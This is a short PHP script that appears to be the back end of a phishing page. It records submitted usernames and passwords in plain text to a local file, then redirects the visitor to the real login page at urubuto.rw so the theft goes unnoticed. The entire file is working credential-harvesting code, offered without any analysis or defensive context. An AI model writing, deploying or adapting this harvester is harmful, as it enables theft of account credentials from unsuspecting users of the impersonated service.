<?php 
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['unames'];
    $password = $_POST['passwrd'];

    file_put_contents("usernames.txt", "Username: " . $username . " Pass: " . $password . "\n", FILE_APPEND);
}

header('Location: https://urubuto.rw/auth');
exit();
?>
